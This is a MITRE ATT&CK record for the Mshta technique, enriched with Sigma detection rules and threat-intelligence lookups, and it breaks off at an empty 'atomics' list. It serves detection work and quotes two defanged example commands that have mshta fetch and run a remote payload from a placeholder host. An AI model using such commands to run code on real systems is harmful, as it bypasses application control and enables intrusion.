{
    "id": "T1218.005",
    "name": "Mshta",
    "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\nFiles may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))`\nThey may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Creation, File: File Creation, Command: Command Execution, Network Traffic: Network Connection Creation",
    "detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
    "url": "https://attack.mitre.org/techniques/T1218/005",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1218.005",
                "atomic_attack_guid": "8707a805-2b76-4f32-b1c0-14e558205772",
                "atomic_attack_name": "Mshta used to Execute PowerShell",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Read Contents From Stdin Via Cmd.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_stdin_redirect.yml",
                        "remote_content": "title: Read Contents From Stdin Via Cmd.EXE\nid: 241e802a-b65e-484f-88cd-c2dc10f9206d\nrelated:\n    - id: 00a4bacd-6db4-46d5-9258-a7d5ebff4003\n      type: obsolete\nstatus: test\ndescription: Detect the use of \"<\" to read and potentially execute a file via cmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1059.003/T1059.003.md\n    - https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-07\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|contains: '<'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "MSHTA Suspicious Execution 01",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml",
                        "remote_content": "title: MSHTA Suspicious Execution 01\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)\ndate: 2019-02-22\nmodified: 2022-11-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\mshta.exe'\n        CommandLine|contains:\n            - 'vbscript'\n            - '.jpg'\n            - '.png'\n            - '.lnk'\n            # - '.chm'  # could be prone to false positives\n            - '.xls'\n            - '.doc'\n            - '.zip'\n            - '.dll'\n            # - '.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n"
                    },
                    {
                        "rule_name": "Wscript Shell Run In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
                        "remote_content": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218.005",
                "atomic_attack_guid": "906865c3-e05f-4acc-85c4-fbc185455095",
                "atomic_attack_name": "Mshta executes VBScript to execute malicious command",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "MSHTA Suspicious Execution 01",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml",
                        "remote_content": "title: MSHTA Suspicious Execution 01\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: test\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n    - https://twitter.com/mattifestation/status/1326228491302563846\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)\ndate: 2019-02-22\nmodified: 2022-11-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1218.005\n    - attack.execution\n    - attack.t1059.007\n    - cve.2020-1599\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\mshta.exe'\n        CommandLine|contains:\n            - 'vbscript'\n            - '.jpg'\n            - '.png'\n            - '.lnk'\n            # - '.chm'  # could be prone to false positives\n            - '.xls'\n            - '.doc'\n            - '.zip'\n            - '.dll'\n            # - '.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n"
                    },
                    {
                        "rule_name": "Wscript Shell Run In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
                        "remote_content": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218.005",
                "atomic_attack_guid": "1483fab9-4f52-4217-a9ce-daa9d7747cae",
                "atomic_attack_name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Remotely Hosted HTA File Executed Via Mshta.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_http.yml",
                        "remote_content": "title: Remotely Hosted HTA File Executed Via Mshta.EXE\nid: b98d0db6-511d-45de-ad02-e82a98729620\nstatus: test\ndescription: Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-08\nmodified: 2023-02-06\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - 'ftp://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious JavaScript Execution Via Mshta.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml",
                        "remote_content": "title: Suspicious JavaScript Execution Via Mshta.EXE\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nstatus: test\ndescription: Detects execution of javascript code using \"mshta.exe\".\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2023-02-07\ntags:\n    - attack.defense-evasion\n    - attack.t1218.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_cli:\n        CommandLine|contains: 'javascript'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                    "2e4e488a-6164-4811-9ea1-f960c7359c40",
                    "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                    "67f113fa-e23d-4271-befa-30113b3e08b1",
                    "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
                    "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
                    "03cc0c25-389f-4bf8-b48d-11878079f1ca",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                    "b98d0db6-511d-45de-ad02-e82a98729620",
                    "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                    "840a987a-99bd-4a80-a5c9-0cb2baa6cade"
                ],
                "lookup_results": [
                    {
                        "uuid": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                        "lookup_data": {
                            "description": "Detects a suspicious parent of csc.exe, which could by a sign of payload delivery",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/11\ndescription: Detects a suspicious parent of csc.exe, which could by a sign of payload\n  delivery\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\csc.exe\n    ParentImage|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\nfalsepositives:\n- Unknown\nid: b730a276-6b63-41b8-bcf8-55930c8fc6ee\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://twitter.com/SBousseaden/status/1094924091256176641\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\n- attack.defense_evasion\n- attack.t1218.005\n- attack.t1027.004\ntitle: Suspicious Parent of Csc.exe\n",
                            "sigma:id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
                            "title": "Suspicious Parent of Csc.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2e4e488a-6164-4811-9ea1-f960c7359c40",
                        "lookup_data": {
                            "description": "Detects remote thread creation from CACTUSTORCH as described in references.",
                            "raw": "author: '@SBousseaden (detection), Thomas Patzke (rule)'\ndate: 2019/02/01\ndescription: Detects remote thread creation from CACTUSTORCH as described in references.\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\System32\\cscript.exe\n    - \\System32\\wscript.exe\n    - \\System32\\mshta.exe\n    - \\winword.exe\n    - \\excel.exe\n    StartModule: null\n    TargetImage|contains: \\SysWOW64\\\nfalsepositives:\n- Unknown\nid: 2e4e488a-6164-4811-9ea1-f960c7359c40\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/SBousseaden/status/1090588499517079552\n- https://github.com/mdsecactivebreach/CACTUSTORCH\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.012\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1218.005\ntitle: CACTUSTORCH Remote Thread Creation\n",
                            "sigma:id": "2e4e488a-6164-4811-9ea1-f960c7359c40",
                            "title": "CACTUSTORCH Remote Thread Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                        "lookup_data": {
                            "description": "Detects activity that could be related to Baby Shark malware",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/24\ndescription: Detects activity that could be related to Baby Shark malware\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\n    - powershell.exe mshta.exe http\n    - cmd.exe /c taskkill /im cmd.exe\nfalsepositives:\n- Unknown\nid: 2b30fa36-3a18-402f-a22d-bf4ce2189f35\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.001\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1218.005\ntitle: Baby Shark Activity\n",
                            "sigma:id": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                            "title": "Baby Shark Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "67f113fa-e23d-4271-befa-30113b3e08b1",
                        "lookup_data": {
                            "description": "Identifies suspicious mshta.exe commands.",
                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\ndescription: Identifies suspicious mshta.exe commands.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: javascript\n    Image|endswith: \\mshta.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.005\ntitle: Mshta JavaScript Execution\n",
                            "sigma:id": "67f113fa-e23d-4271-befa-30113b3e08b1",
                            "title": "Mshta JavaScript Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
                        "lookup_data": {
                            "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism",
                            "raw": "author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)\ndate: 2019/02/22\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving\n  file polyglotism\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - vbscript\n    - .jpg\n    - .png\n    - .lnk\n    - .xls\n    - .doc\n    - .zip\n    - .dll\n    Image|endswith: \\mshta.exe\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/07\nreferences:\n- http://blog.sevagas.com/?Hacking-around-HTA-files\n- https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n- https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\n- https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\n- https://twitter.com/mattifestation/status/1326228491302563846\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1140\n- attack.t1218.005\n- attack.execution\n- attack.t1059.007\n- cve.2020.1599\ntitle: MSHTA Suspicious Execution 01\n",
                            "sigma:id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
                            "title": "MSHTA Suspicious Execution 01",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
                        "lookup_data": {
                            "description": "Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report",
                            "raw": "author: Markus Neis\ndate: 2018/06/07\ndescription: Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described\n  in report\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\mshta.exe\n    ParentImage|endswith: \\svchost.exe\nfalsepositives:\n- Unknown\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://codewhitesec.blogspot.com/2018/07/lethalhta.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.005\ntitle: MSHTA Spwaned by SVCHOST\n",
                            "sigma:id": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
                            "title": "MSHTA Spwaned by SVCHOST",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
                        "lookup_data": {
                            "description": "Detects a Windows command line executable started from MSHTA",
                            "raw": "author: Michael Haag\ndate: 2019/01/16\ndescription: Detects a Windows command line executable started from MSHTA\ndetection:\n  condition: all of selection*\n  selection1:\n    ParentImage|endswith: \\mshta.exe\n  selection2:\n  - Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\sh.exe\n    - \\bash.exe\n    - \\reg.exe\n    - \\regsvr32.exe\n  - Image|contains: \\BITSADMIN\nfalsepositives:\n- Printer software / driver installations\n- HP software\nfields:\n- CommandLine\n- ParentCommandLine\nid: 03cc0c25-389f-4bf8-b48d-11878079f1ca\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://www.trustedsec.com/july-2015/malicious-htas/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.005\n- car.2013-02-003\n- car.2013-03-001\n- car.2014-04-003\ntitle: MSHTA Spawning Windows Shell\n",
                            "sigma:id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
                            "title": "MSHTA Spawning Windows Shell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b98d0db6-511d-45de-ad02-e82a98729620",
                        "lookup_data": {
                            "description": "Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/08\ndescription: Detects execution of the \"mshta\" utility with an argument containing\n  the \"http\" keyword, which could indicate that an attacker is executing a remotely\n  hosted malicious hta file\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - http://\n    - https://\n    - ftp://\n  selection_img:\n  - Image|endswith: \\mshta.exe\n  - OriginalFileName: MSHTA.EXE\nfalsepositives:\n- Unknown\nid: b98d0db6-511d-45de-ad02-e82a98729620\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/19\nreferences:\n- https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.005\ntitle: Mshta Remotely Hosted HTA File Execution\n",
                            "sigma:id": "b98d0db6-511d-45de-ad02-e82a98729620",
                            "title": "Mshta Remotely Hosted HTA File Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                        "lookup_data": {
                            "description": "Detects execution of executables that can be used to bypass Applocker whitelisting",
                            "raw": "author: juju4\ndate: 2019/01/16\ndescription: Detects execution of executables that can be used to bypass Applocker\n  whitelisting\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - \\msdt.exe\n    - \\installutil.exe\n    - \\regsvcs.exe\n    - \\regasm.exe\n    - \\msbuild.exe\n    - \\ieexec.exe\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\n- Using installutil to add features for .NET applications (primarily would occur in\n  developer environments)\nid: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/01\nreferences:\n- https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt\n- https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1118\n- attack.t1218.004\n- attack.t1121\n- attack.t1218.009\n- attack.t1127\n- attack.t1127.001\n- attack.t1170\n- attack.t1218.005\n- attack.t1218\ntitle: Possible Applocker Bypass\n",
                            "sigma:id": "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                            "title": "Possible Applocker Bypass",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "840a987a-99bd-4a80-a5c9-0cb2baa6cade",
                        "lookup_data": {
                            "mitre-attack-id": "T1218.005",
                            "mitre-cti:description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
                            "mitre-cti:name": "Mshta",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['@ionstorm', 'Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank', 'Ricardo Dias'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade', 'type': 'attack-pattern', 'created': '2020-01-23T19:32:49.557Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005'}, {'url': 'https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf', 'description': 'Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.', 'source_name': 'Cylance Dust Storm'}, {'source_name': 'Red Canary HTA Abuse Part Deux', 'description': 'McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.', 'url': 'https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/'}, {'url': 'https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html', 'description': 'Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.', 'source_name': 'FireEye Attacks Leveraging HTA'}, {'description': 'Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.', 'source_name': 'Airbus Security Kovter Analysis', 'url': 'https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/'}, {'url': 'https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html', 'description': 'Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.', 'source_name': 'FireEye FIN7 April 2017'}, {'source_name': 'Wikipedia HTML Application', 'description': 'Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.', 'url': 'https://en.wikipedia.org/wiki/HTML_Application'}, {'source_name': 'MSDN HTML Applications', 'description': 'Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.', 'url': 'https://msdn.microsoft.com/library/ms536471.aspx'}, {'source_name': 'LOLBAS Mshta', 'url': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/', 'description': 'LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.'}], 'modified': '2022-03-11T20:38:28.802Z', 'name': 'Mshta', 'description': 'Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \\n\\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\\n\\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\\n\\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\\n\\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer\\'s security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\\n\\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '2.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Creation', 'File: File Creation', 'Network Traffic: Network Connection Creation', 'Command: Command Execution'], 'x_mitre_defense_bypassed': ['Application control', 'Digital Certificate Validation'], 'x_mitre_permissions_required': ['User']}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
